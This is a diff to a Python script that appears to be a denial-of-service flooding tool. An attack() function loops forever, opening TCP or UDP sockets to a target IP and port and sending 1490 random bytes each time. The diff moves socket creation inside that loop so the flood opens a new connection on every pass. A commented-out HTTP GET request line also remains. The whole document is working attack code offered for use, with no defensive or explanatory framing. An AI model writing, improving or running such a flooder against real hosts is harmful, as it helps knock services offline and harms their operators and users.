@@ -67,18 +67,6 @@ def main():
   bytes = random._urandom(1490)
   pocket = 0
 
-
-
-
-  if protocol == "TCP": 
-    s = socket(AF_INET, SOCK_STREAM)
-
-  elif protocol == "UDP":
-    s = socket(AF_INET, SOCK_DGRAM)
-  
-  else:
-    print("undefined protocol!, Ctrl + C to close!")
-
   os.system("clear")
   #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
   #os.system ("clear")
@@ -87,6 +75,15 @@ def main():
     #sleep_time = 2 
 def attack():
   while True:
+    if protocol == "TCP": 
+      s = socket(AF_INET, SOCK_STREAM)
+
+    elif protocol == "UDP":
+      s = socket(AF_INET, SOCK_DGRAM)
+  
+    else:
+      print("undefined protocol!, Ctrl + C to close!")
+      
     s.connect((ip, port))
     s.send(bytes)
     #s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
